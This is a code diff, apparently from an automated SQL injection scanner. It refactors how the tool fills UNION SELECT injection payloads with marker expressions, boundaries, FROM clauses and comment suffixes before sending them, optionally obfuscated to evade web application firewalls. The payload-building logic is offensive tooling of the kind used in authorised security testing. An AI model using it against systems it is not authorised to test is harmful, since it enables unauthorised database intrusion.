@@ -1,5 +1,5 @@
 import { URL } from 'url';
-import { fillPayload } from './payloads.js';
+import { fillPayload, replaceAllLiteral } from './payloads.js';
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
 import { resolveDbms, resolveFromClause, commentSuffix } from './DialectSqlBuilder.js';
 // [P0-FIX 2026-09-09] 出口选项同源 + 失败响应结构（见 egressOpts.js 顶部三起事故）
@@ -339,9 +339,13 @@ function _markerProbe(ctx, columns, markerExprs, boundary, fromClause = '') {
   const { target, point } = ctx;
   const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
   const payload =
-    fillPayload('{ORIG} UNION SELECT {MARKERS}', {
-      orig: `${point.originalValue || '1'}${boundary}`,
-    }).replace('{MARKERS}', markerExprs.join(',')) + fromClause + suffix;
+    replaceAllLiteral(
+      fillPayload('{ORIG} UNION SELECT {MARKERS}', {
+        orig: `${point.originalValue || '1'}${boundary}`,
+      }),
+      '{MARKERS}',
+      markerExprs.join(',')
+    ) + fromClause + suffix;
   return { payload, req: buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload)) };
 }
 
@@ -439,9 +443,14 @@ async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClau
       if (textCols.length === 1) {
         const single = Array.from({ length: columns }, () => 'NULL');
         single[r.i] = `'${MARKER}${r.i}'`;
-        evidence = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
-          orig: `${ctx.point?.originalValue || '1'}${boundary}`,
-        }).replace('{MARKERS}', single.join(',')) + fromClause + suffix;
+        evidence =
+          replaceAllLiteral(
+            fillPayload('{ORIG} UNION SELECT {MARKERS}', {
+              orig: `${ctx.point?.originalValue || '1'}${boundary}`,
+            }),
+            '{MARKERS}',
+            single.join(',')
+          ) + fromClause + suffix;
       }
     }
   }
